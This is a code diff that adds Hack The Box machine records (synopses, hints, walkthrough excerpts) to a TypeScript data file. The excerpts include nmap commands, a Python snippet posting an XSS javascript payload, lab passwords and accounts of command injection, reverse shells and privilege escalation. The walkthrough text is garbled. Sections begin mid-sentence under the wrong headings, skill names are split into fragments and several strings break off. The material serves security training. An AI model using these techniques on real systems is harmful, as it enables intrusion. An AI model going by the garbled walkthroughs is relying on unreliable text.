+    "officialSynopsis": "ScriptKiddie is an easy difficulty Linux machine that presents a Metasploit vulnerability (CVE-2020-7384), along with classic attacks such as OS command injection and an insecure passwordless sudo configuration. Initial foothold on the machine is gained by uploading a malicious .apk file from a web interface that calls a vulnerable version of msfvenom to generate downloadable payloads. Once shell is obtained, lateral movement to a second user is performed by injecting commands into a log file which provides unsanitized input to a Bash script that is triggered on file modification.",
+    "skillsLearned": [
+      "Exploiting CVE",
+      "2020",
+      "7384",
+      "OS Command Injection in command arguments",
+      "Running system commands from Metasploit console"
+    ],
+    "officialPdf": "314-ScriptKiddie_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nScriptKiddie is an easy difficulty Linux machine that presents a Metasploit vulnerability (CVE-2020-7384), along with classic attacks such as OS command injection and an insecure passwordless sudo configuration. Initial foothold on the machine is gained by uploading a malicious .apk file from a web interface that calls a vulnerable version of msfvenom to generate downloadable payloads. Once shell is obtained, lateral movement to a second user is performed by injecting commands into a log file which provides unsanitized input to a Bash script that is triggered on file modification.\n\n### 🎯 Core Skills\n- **Exploiting CVE**\n- **2020**\n- **7384**\n- **OS Command Injection in command arguments**\n- **Running system commands from Metasploit console**\n\n### 🛡️ Associated CVEs\n`CVE-2020-7384`\n\n### ⚔️ Foothold Vector\non the machine is gained by uploading a malicious .apk file from a web interface that calls a vulnerable version of msfvenom to generate downloadable payloads. Once shell is obtained, lateral movement to a second user is performed by injecting commands into a log file which provides unsanitized input to a Bash script that is triggered on file modification. This user is allowed to run msfconsole as\n\n### 👑 Privilege Escalation\nvia sudo without supplying a password, resulting in the escalation of privileges. Skills Required Basic Linux and Bash knowledge Metasploit usage Skills Learned Exploiting CVE-2020-7384 OS Command Injection in command arguments Running system commands from Metasploit console Enumeration Nmap Nmap shows that OpenSSH is listening to its default port (22). Additionally, a Werkzeug httpd server is listening on port 5000. HTTP The web server on port 5000 returns a page called k1d'5 h4ck3r t00l5 , where some attacking activities can be performed. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.226 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sV -sC 10.10.10."
   },
   {
     "id": "htb-sink",
@@ -7354,15 +8364,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "HTTP-Desync"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/sink",
     "writeupUrl": "https://0xdf.gitlab.io/tags#sink",
-    "hint": "Hack The Box Linux machine. Rated Insane difficulty.",
+    "hint": "Sink is an insane Linux machine that features an application which is vulnerable to HTTP Desync attack. Exploiting this vulnerability gives access to a high privileged user on the application.",
     "timeSpentSeconds": 0,
     "createdAt": "2021-01-30T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Sink is an insane Linux machine that features an application which is vulnerable to HTTP Desync attack. Exploiting this vulnerability gives access to a high privileged user on the application. This privilege gives access to Gitea service.",
+    "skillsLearned": [
+      "HTTP Desync"
+    ],
+    "officialPdf": "313-Sink_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nSink is an insane Linux machine that features an application which is vulnerable to HTTP Desync attack. Exploiting this vulnerability gives access to a high privileged user on the application. This privilege gives access to Gitea service.\n\n### 🎯 Core Skills\n- **HTTP Desync**\n\n### ⚔️ Foothold Vector\non system. Enumerating SecretsManager service reveals credentials which assists in moving laterally. System access can be obtained by decrypting a file using the KMS service. Skills Required Enumeration OWASP Top 10 Basic AWS Cloud Knowledge Skills Learned HTTP Desync Exploitation AWS CloudWatch AWS SecretsManager AWS KMS Enumeration Nmap Nmap scan reveals that the target server has three ports open. We browse to port 3000. ports=$(nmap -p- --min-rate=1000 -T4 10.129.200.88 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -sC -sV -p$ports 10.129.200.88 Gitea is a self hosted Git service. Registration feature is disabled in this application. Let's browse to the Explore page.\n\n### 👑 Privilege Escalation\nPassword : FaH@3L>Z3})zzfQ3 Nagios URL : https://nagios.sink.htb Username : nagios_adm Password : g8<H6GK\\{*L.fB3C We notice the four repositories available. Navigating to Explore reveals that one of the repo is archived. Looking at the commits we see in one of the commit the user marcus changing the contents of ec2.php file. In the same commit we also observe that he accidentally placed .keys folder with SSH private key contents. We copy the key and attempt to login to the SSH as user marcus . This is indeed successful. User flag can be now found in /home/marcus/user.txt file. Lateral Movement Log_Management repository includes a file named create_logs.php . We review the content of it."
   },
   {
     "id": "htb-tentacle",
@@ -7373,15 +8390,19 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
+      "CVE-2020-7247",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/tentacle",
     "writeupUrl": "https://0xdf.gitlab.io/tags#tentacle",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Tentacle is a Hard linux machine featuring a Squid proxy server. Bypassing Squid proxy authentication reveals a host which is making use of a vulnerable OpenSMTPD service.",
     "timeSpentSeconds": 0,
     "createdAt": "2021-01-23T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Tentacle is a Hard linux machine featuring a Squid proxy server. Bypassing Squid proxy authentication reveals a host which is making use of a vulnerable OpenSMTPD service. Initial foothold can be achieved by the exploitation of it. A SMTP client configuration file discloses a password which assists in generating a valid Kerberos ticket. This ticket then can be used to move laterally. Finally a cronjob can be exploited to escalate to another user who has privileges to add root user to Kerberos principals. This gives us a root shell.",
+    "officialPdf": "310-Tentacle_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nTentacle is a Hard linux machine featuring a Squid proxy server. Bypassing Squid proxy authentication reveals a host which is making use of a vulnerable OpenSMTPD service. Initial foothold can be achieved by the exploitation of it. A SMTP client configuration file discloses a password which assists in generating a valid Kerberos ticket. This ticket then can be used to move laterally. Finally a cronjob can be exploited to escalate to another user who has privileges to add root user to Kerberos principals. This gives us a root shell.\n\n### 🛡️ Associated CVEs\n`CVE-2020-7247`\n\n### ⚔️ Foothold Vector\ncan be achieved by the exploitation of it. A SMTP client configuration file discloses a password which assists in generating a valid Kerberos ticket. This ticket then can be used to move laterally. Finally a cronjob can be exploited to escalate to another user who has privileges to add\n\n### 👑 Privilege Escalation\nuser to Kerberos principals. This gives us a root shell. Skills Required Enumeration Basic Linux Knowledge Skills Learned DNS Enumeration Squid Proxy Enumeration OpenSMTPD Exploitation Kerberos Enumeration Nmap Let's start by performing a port scan. Nmap TCP scan reveals few ports including Kerberos and Squid Proxy which are listening on their default ports. Let's perform also an UDP port scan. UDP scan reveals that DNS ISC BIND, Kerberos and NTP are also listening on their default ports. Squid Proxy Browsing to port 3128 reveals a domain name and an email address. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10."
   },
   {
     "id": "htb-tenet",
@@ -7397,10 +8418,13 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/tenet",
     "writeupUrl": "https://0xdf.gitlab.io/tags#tenet",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Tenet is a Medium difficulty machine that features an Apache web server. It contains a Wordpress blog with a few posts.",
     "timeSpentSeconds": 0,
     "createdAt": "2021-01-16T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Tenet is a Medium difficulty machine that features an Apache web server. It contains a Wordpress blog with a few posts. One of the comments on the blog mentions the presence of a PHP file along with it's backup. It is possible after identificaiton of the backup file to review it's source code. The code in PHP file is vulnerable to an insecure deserialisation vulnerability and by successful exploiting it a foothold on the system is achieved. While enumerating the system it was found that the Wordpress configuration file can be read and thus gaining access to a set of credentials.",
+    "officialPdf": "309-Tenet_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nTenet is a Medium difficulty machine that features an Apache web server. It contains a Wordpress blog with a few posts. One of the comments on the blog mentions the presence of a PHP file along with it's backup. It is possible after identificaiton of the backup file to review it's source code. The code in PHP file is vulnerable to an insecure deserialisation vulnerability and by successful exploiting it a foothold on the system is achieved. While enumerating the system it was found that the Wordpress configuration file can be read and thus gaining access to a set of credentials.\n\n### ⚔️ Foothold Vector\non the system is achieved. While enumerating the system it was found that the Wordpress configuration file can be read and thus gaining access to a set of credentials. By using them we can move laterally from user www-data to user Neil . Further system enumeration reveals that this user have\n\n### 👑 Privilege Escalation\npermissions to run a bash script through sudo . The script is writing SSH public keys to the authorized_keys file of the root user and is vulnerable to a race condition. After successful exploitation, attackers can write their own SSH keys to the authorized_keys file and use them to login to the system as root . Skills Required Enumeration Good knowledge of PHP Bash scripting knowledge Skills Learned Exploitation of an Insecure Deserialisation Exploitation of a Race Condition in a Bash script Enumeration Nmap Let's begin by running nmap scan. The scan reveals open ports 22 (SSH) and 80 (Apache). HTTP Navigate to port 80 using a browser to check out the website."
   },
   {
     "id": "htb-delivery",
@@ -7411,15 +8435,23 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
+      "Email-impersonation",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/delivery",
     "writeupUrl": "https://0xdf.gitlab.io/tags#delivery",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Delivery is an easy difficulty Linux machine that features the support ticketing system osTicket where it is possible by using a technique called TicketTrick, a non-authenticated user to be granted with access to a temporary company email. This \"feature\" permits the registration ",
     "timeSpentSeconds": 0,
     "createdAt": "2021-01-09T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Delivery is an easy difficulty Linux machine that features the support ticketing system osTicket where it is possible by using a technique called TicketTrick, a non-authenticated user to be granted with access to a temporary company email. This \"feature\" permits the registration at MatterMost and the join of internal team channel. It is revealed through that channel that users have been using same password variant \"PleaseSubscribe!\" for internal access. In channel it is also disclosed the credentials for the mail user which can give the initial foothold to the system.",
+    "skillsLearned": [
+      "Email impersonation",
+      "Intermediate password cracking"
+    ],
+    "officialPdf": "308-Delivery_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nDelivery is an easy difficulty Linux machine that features the support ticketing system osTicket where it is possible by using a technique called TicketTrick, a non-authenticated user to be granted with access to a temporary company email. This \"feature\" permits the registration at MatterMost and the join of internal team channel. It is revealed through that channel that users have been using same password variant \"PleaseSubscribe!\" for internal access. In channel it is also disclosed the credentials for the mail user which can give the initial foothold to the system.\n\n### 🎯 Core Skills\n- **Email impersonation**\n- **Intermediate password cracking**\n\n### ⚔️ Foothold Vector\nto the system. While enumerating the file system we come across the mattermost configuration file which reveals MySQL database credentials. By having access to the database a password hash can be extracted from Users table and crack it using the \"PleaseSubscribe!\" pattern. After cracking the hash it is possible to login as user\n\n### 👑 Privilege Escalation\n. Skills Required Basic web enumeration Brute force Skills Learned Email impersonation Intermediate password cracking Enumeration Nmap reveals three running services, SSH at port 22, a web server at the 80 port and an unknown service at 8065. Browsing to http://10.10.10.222 reveals a \"Delivery\" landing page. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.222 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.10.222 Frontend looks like a static HTML page but HELPDESK link redirects to http://helpdesk.delivery.htb/ . We should add the above hostname at the /etc/hosts file on our local machine."
   },
   {
     "id": "htb-attended",
@@ -7430,15 +8462,28 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "CVE-2019-12735",
+      "Creating-an-HTTP",
+      "HTB",
+      "based-pseudo",
+      "reverse-shell"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/attended",
     "writeupUrl": "https://0xdf.gitlab.io/tags#attended",
-    "hint": "Hack The Box Linux machine. Rated Insane difficulty.",
+    "hint": "Attended is an insane difficulty OpenBSD machine that presents a variety of different concepts like phishing, exploiting CVEs, bypassing outbound traffic restrictions, detecting misconfigurations and binary exploitation (with an interesting twist in the way the payload had to be ",
     "timeSpentSeconds": 0,
     "createdAt": "2020-12-19T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Attended is an insane difficulty OpenBSD machine that presents a variety of different concepts like phishing, exploiting CVEs, bypassing outbound traffic restrictions, detecting misconfigurations and binary exploitation (with an interesting twist in the way the payload had to be delivered). Foothold is gained by exploiting a Vim modeline vulnerability in a text attachment sent as an email message. This results in remote command execution but since only HTTP outbound traffic is allowed a workaround is featured by using a simple HTTP client/server application. System",
+    "skillsLearned": [
+      "Creating an HTTP",
+      "based pseudo",
+      "reverse shell",
+      "Finding uncommon gadgets for ROP"
+    ],
+    "officialPdf": "307-Attended_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nAttended is an insane difficulty OpenBSD machine that presents a variety of different concepts like phishing, exploiting CVEs, bypassing outbound traffic restrictions, detecting misconfigurations and binary exploitation (with an interesting twist in the way the payload had to be delivered). Foothold is gained by exploiting a Vim modeline vulnerability in a text attachment sent as an email message. This results in remote command execution but since only HTTP outbound traffic is allowed a workaround is featured by using a simple HTTP client/server application. System\n\n### 🎯 Core Skills\n- **Creating an HTTP**\n- **based pseudo**\n- **reverse shell**\n- **Finding uncommon gadgets for ROP**\n\n### 🛡️ Associated CVEs\n`CVE-2019-12735`\n\n### ⚔️ Foothold Vector\n(with an interesting twist in the way the payload had to be delivered). Foothold is gained by exploiting a Vim modeline vulnerability in a text attachment sent as an email message. This results in remote command execution but since only HTTP outbound traffic is allowed a workaround is featured by using a simple HTTP client/server application. System enumeration leads to a shared directory where ssh configuration files can be written to be executed by another user ( freshness ), allowing to run arbitrary commands via the ProxyCommand configuration directive. An executable binary vulnerable to a stack-based buffer overflow is then exploited to gain code execution as\n\n### 👑 Privilege Escalation\n(on a different host) by delivering a malicious payload through an SSH private key (the vulnerable program is configured as the AuthorizedKeysCommand in the sshd configuration). Skills Required Basic OpenBSD knowledge Enumeration Scripting Binary Exploitation and Return-oriented Programming Skills Learned Creating an HTTP-based pseudo-reverse shell Finding uncommon gadgets for ROP exploitation Knowledge of the OpenSSH private key format Enumeration Nmap Nmap shows two open ports, corresponding to the OpenSSH (port 22) and OpenSMTPD (port 25) services. The SMTP banner, which is displayed as part of the nmap scripts output, reveals a domain name ( attended."
   },
   {
     "id": "htb-ready",
@@ -7449,15 +8494,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "CVE-2018-19571",
+      "CVE-2018-19585",
+      "Docker-Escape",
+      "HTB",
+      "SSRF-&-CRLF-Attacks"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/ready",
     "writeupUrl": "https://0xdf.gitlab.io/tags#ready",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Ready is a medium difficulty Linux machine. A vulnerable version of GitLab server leads to a remote command execution, by exploiting a combination of SSRF and CRLF vulnerabilities.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-12-12T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Ready is a medium difficulty Linux machine. A vulnerable version of GitLab server leads to a remote command execution, by exploiting a combination of SSRF and CRLF vulnerabilities. Bad permission on a backed up configuration file of the Gitlab server, reveals a password that is found to be reusable for the user root , inside a docker container. After root access is acquired, escaping the container is possible since it is running in privileged mode.",
+    "skillsLearned": [
+      "SSRF & CRLF Attacks",
+      "Docker Escape"
+    ],
+    "officialPdf": "304-Ready_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nReady is a medium difficulty Linux machine. A vulnerable version of GitLab server leads to a remote command execution, by exploiting a combination of SSRF and CRLF vulnerabilities. Bad permission on a backed up configuration file of the Gitlab server, reveals a password that is found to be reusable for the user root , inside a docker container. After root access is acquired, escaping the container is possible since it is running in privileged mode.\n\n### 🎯 Core Skills\n- **SSRF & CRLF Attacks**\n- **Docker Escape**\n\n### 🛡️ Associated CVEs\n`CVE-2018-19571`, `CVE-2018-19585`\n\n### ⚔️ Foothold Vector\nThe version of the Gitlab is found to be 11.4.7 . Searching online for vulnerabilities on Gitlab 11.4.7 , it is possible to find that this version has multiple vulnerabilities. There are multiple vulnerabilities for Gitlab but we are going to focus on a way to exploit a combination of SSRF (CVE-2018-19571) and CRLF (CVE-2018-19585) vulnerabilities. According to the GitLab Security Release, both vulnerabilities are taking place in this version of Gitlab. The SSRF vulnerability is on the specific version of Redis. We are going to trigger SSRF via importing a new repository by URL. First we create a new project.\n\n### 👑 Privilege Escalation\n, inside a docker container. After root access is acquired, escaping the container is possible since it is running in privileged mode. Skills required Basic Web Enumeration Basic knowledge of Linux Basic knowledge of Docker Skills learned SSRF & CRLF Attacks Docker Escape Enumeration Nmap output reveals an instance of a Gitlab server on port 5080, and an SSH server running on port 22. We can register an account on Github by navigating to Register section and fill up fields. ports=$(nmap 10.10.10.220 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.10.220 After registering, it will redirect us to the welcome page."
   },
   {
     "id": "htb-sharp",
@@ -7473,10 +8529,16 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/sharp",
     "writeupUrl": "https://0xdf.gitlab.io/tags#sharp",
-    "hint": "Hack The Box Windows machine. Rated Hard difficulty.",
+    "hint": "Sharp is a hard difficulty Windows machine which features .NET remoting services. Reversing a software accessible from open SMB share reveals user credentials.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-12-05T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Sharp is a hard difficulty Windows machine which features .NET remoting services. Reversing a software accessible from open SMB share reveals user credentials. These credentials can be used to access a .NET remoting services application, which can be later downloaded from a private SMB share. By exploiting this service it is possible to get a foothold on the server. WCF service project is accessible and service can be exploited to gain root access on the system.",
+    "skillsLearned": [
+      "Reversing .NET Applications"
+    ],
+    "officialPdf": "303-Sharp_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nSharp is a hard difficulty Windows machine which features .NET remoting services. Reversing a software accessible from open SMB share reveals user credentials. These credentials can be used to access a .NET remoting services application, which can be later downloaded from a private SMB share. By exploiting this service it is possible to get a foothold on the server. WCF service project is accessible and service can be exploited to gain root access on the system.\n\n### 🎯 Core Skills\n- **Reversing .NET Applications**\n\n### ⚔️ Foothold Vector\non the server. WCF service project is accessible and service can be exploited to gain\n\n### 👑 Privilege Escalation\naccess on the system. Skills Required Enumeration Scripting Basic Knowledge of Windows Skills Learned Reversing .NET Applications Exploitation of .NET Remoting Services Exploitation of WCF Remoting Services Enumeration Nmap We can start by running a full nmap scan. Tool nmap reveals that the target host is a Windows system that features SMB, WinRM, StorageCraft Image Manager, .NET Message Framing services running on their default ports. SMB Let's check if the SMB server allows null sessions using smbmap tool. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.219 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.10."
   },
   {
     "id": "htb-luanne",
@@ -7487,15 +8549,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Lua-Code-Injection",
+      "NetPGP-and-doas-Abuse"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/luanne",
     "writeupUrl": "https://0xdf.gitlab.io/tags#luanne",
-    "hint": "Hack The Box Other machine. Rated Easy difficulty.",
+    "hint": "Luanne is an easy difficulty NetBSD Linux machine. Network",
     "timeSpentSeconds": 0,
     "createdAt": "2020-11-28T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Luanne is an easy difficulty NetBSD Linux machine. Network",
+    "skillsLearned": [
+      "Lua Code Injection",
+      "NetPGP and doas Abuse"
+    ],
+    "officialPdf": "302-Luanne_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nLuanne is an easy difficulty NetBSD Linux machine. Network\n\n### 🎯 Core Skills\n- **Lua Code Injection**\n- **NetPGP and doas Abuse**\n\n### ⚔️ Foothold Vector\nWe notice that if we input a random string, such as test , the output is displayed back to the user as an error message. Searching online for httpd Lua vulnerabilities reveals the following article as the first result. Scrolling down to the LUA CODE INJECTION , we can see some vulnerable examples for Nginx and CGI. curl -v http://10.10.10.218/weather/forecast?city=test Let's try one of these on the bozohttpd server and check if it works. This is successful. We can now execute commands on the host as the user _httpd . Let's get a reverse shell using the following commands. First, we start a Netcat listener on our attacking machine on port 4444.\n\n### 👑 Privilege Escalation\n, using the command doas . Skills Required Web Enumeration Linux Enumeration Skills Learned Lua Code Injection NetPGP and doas Abuse Enumeration Nmap output reveals an SSH server and an Nginx server running on their default ports. A Medusa server is also running on port 9001. Navigating to both port 80 and port 9001 using a web browser returns an Authentication Required message. Default credentials such as admin / admin or user / user do not appear to grant access on port 80. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.218 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.10."
   },
   {
     "id": "htb-cereal",
@@ -7511,10 +8582,13 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/cereal",
     "writeupUrl": "https://0xdf.gitlab.io/tags#cereal",
-    "hint": "Hack The Box Windows machine. Rated Hard difficulty.",
+    "hint": "Cereal is a hard difficulty Windows machine with a repository exposing source code. One of the older commits is found to leak the encryption key, which can be used to login.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-11-21T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Cereal is a hard difficulty Windows machine with a repository exposing source code. One of the older commits is found to leak the encryption key, which can be used to login. Reviewing the code reveals deserialization and XSS vulnerabilities. These are leveraged to download a web shell and gain a foothold on the system. The user is found to have SeImpersonatePrivilege which is exploited in combination with a SSRF vulnerability to get SYSTEM privileges.",
+    "officialPdf": "299-Cereal_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nCereal is a hard difficulty Windows machine with a repository exposing source code. One of the older commits is found to leak the encryption key, which can be used to login. Reviewing the code reveals deserialization and XSS vulnerabilities. These are leveraged to download a web shell and gain a foothold on the system. The user is found to have SeImpersonatePrivilege which is exploited in combination with a SSRF vulnerability to get SYSTEM privileges.\n\n### ⚔️ Foothold Vector\non the system. The user is found to have SeImpersonatePrivilege which is exploited in combination with a SSRF vulnerability to get SYSTEM privileges. Skills Required Enumeration .NET Code review Scripting GraphQL Skills Learned XSS Exploitation .NET Deserialization SSRF Windows Impersonation Enumeration Nmap Nmap reveals three open ports on the Windows server supporting SSH, HTTP and HTTPS protocols. Additionally, the script scan extracted two virtual hosts cereal.htb and source.cereal.htb from the SSL certificate. We can add these to the hosts file. IIS Browsing to cereal.htb automatically redirects us to the secure version of the website (https).\n\n### 👑 Privilege Escalation\n, we find the SQLite database. cereal = { \"json\": f'{{ \"title\": \"[XSS](javascript: document.write`{js_payload}`)\", \"flavor\" : \"bacon\", \"color\": \"#000\", \"description\": \"test\" }}' } resp = post(url, json=cereal, headers=auth, verify=False) print(resp.text) Executing the command type C:\\inetpub\\cereal\\db\\cereal.db will reveal the credentials for sonny as sonny / mutual.madden.manner38974 . Attempting to login via SSH with these credentials succeeds. ssh sonny@cereal.htb Privilege Escalation Enumerating the user's privileges reveals SeImpersonatePrivilege . This is a very powerful privilege and can be used to gain SYSTEM privileges instantly."
   },
   {
     "id": "htb-laboratory",
@@ -7525,15 +8599,27 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Arbitrary-read-file",
+      "CVE-2020-10977",
+      "HTB",
+      "Marshal-cookie-attack",
+      "SUID"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/laboratory",
     "writeupUrl": "https://0xdf.gitlab.io/tags#laboratory",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Laboratory is an easy difficulty Linux machine that features a GitLab web application in a docker. This application is found to suffer from an arbitrary read file vulnerability, which is leveraged along with a remote command execution to gain a foothold on a docker instance.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-11-14T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Laboratory is an easy difficulty Linux machine that features a GitLab web application in a docker. This application is found to suffer from an arbitrary read file vulnerability, which is leveraged along with a remote command execution to gain a foothold on a docker instance. By giving administration permissions to our GitLab user it is possible to steal private ssh-keys and get a foothold on the box. Post-exploitation",
+    "skillsLearned": [
+      "Arbitrary read file",
+      "Marshal cookie attack",
+      "SUID"
+    ],
+    "officialPdf": "298-Laboratory_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nLaboratory is an easy difficulty Linux machine that features a GitLab web application in a docker. This application is found to suffer from an arbitrary read file vulnerability, which is leveraged along with a remote command execution to gain a foothold on a docker instance. By giving administration permissions to our GitLab user it is possible to steal private ssh-keys and get a foothold on the box. Post-exploitation\n\n### 🎯 Core Skills\n- **Arbitrary read file**\n- **Marshal cookie attack**\n- **SUID**\n\n### 🛡️ Associated CVEs\n`CVE-2020-10977`\n\n### ⚔️ Foothold Vector\non a docker instance. By giving administration permissions to our GitLab user it is possible to steal private ssh-keys and get a foothold on the box. Post-exploitation enumeration reveals that the system Laboratory has an executable program set as setuid. This is leveraged to gain a\n\n### 👑 Privilege Escalation\nenumeration reveals that the system Laboratory has an executable program set as setuid. This is leveraged to gain a root shell on the server. Skills Required Enumeration Basic Rails Knowledge Basic Docker Knowledge Skills Learned Arbitrary read file Marshal cookie attack SUID Exploitation Enumeration Nmap output reveals that the target server has ports 22 (OpenSSH), 80 (Apache httpd) and 443 (Apache SSL httpd) open. Let's browse to port 80. We notice that we are being redirect to laboratory.htb . We need to add it to the /etc/hosts file. We observe that nmap output discloses another hostname i.e. git.laboratory.htb which we also need to add it to our hosts file."
   },
   {
     "id": "htb-academy",
@@ -7544,15 +8630,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Composer",
+      "HTB",
+      "cve-2018-15133",
+      "pam_tty_audit"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/academy",
     "writeupUrl": "https://0xdf.gitlab.io/tags#academy",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Academy is an easy difficulty Linux machine that features an Apache server hosting a PHP website. The website is found to be the HTB Academy learning platform.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-11-07T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Academy is an easy difficulty Linux machine that features an Apache server hosting a PHP website. The website is found to be the HTB Academy learning platform. Capturing the user registration request in Burp reveals that we are able to modify the Role ID, which allows us to access an admin portal. This reveals a vhost, that is found to be running on Laravel. Laravel debug mode is enabled, the exposed API Key and vulnerable version of Laravel allow us carry out a deserialization attack that results in Remote Code Execution. Examination of the Laravel .",
+    "skillsLearned": [
+      "Laravel Token Deserialization",
+      "Composer",
+      "pam_tty_audit"
+    ],
+    "officialPdf": "297-Academy_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nAcademy is an easy difficulty Linux machine that features an Apache server hosting a PHP website. The website is found to be the HTB Academy learning platform. Capturing the user registration request in Burp reveals that we are able to modify the Role ID, which allows us to access an admin portal. This reveals a vhost, that is found to be running on Laravel. Laravel debug mode is enabled, the exposed API Key and vulnerable version of Laravel allow us carry out a deserialization attack that results in Remote Code Execution. Examination of the Laravel .\n\n### 🎯 Core Skills\n- **Laravel Token Deserialization**\n- **Composer**\n- **pam_tty_audit**\n\n### 🛡️ Associated CVEs\n`cve-2018-15133`\n\n### ⚔️ Foothold Vector\nSearching online for Laravel 5.X exploit , we come across this Exploit-DB page. The exploit explains that it's possible to get remote code execution when the Laravel API key is leaked. We can run any code we want via the HTTP X-XSRF-TOKEN header because it makes an insecure unserialize call to Illuminate/Encryption/Encrypter.php . In order to understand the impact of compromised Laravel API, we have to understand how Laravel session cookies work. Let's look at this Laravel session. Laravel sessions are JSON objects, which can be decoded using jwt.io. In this 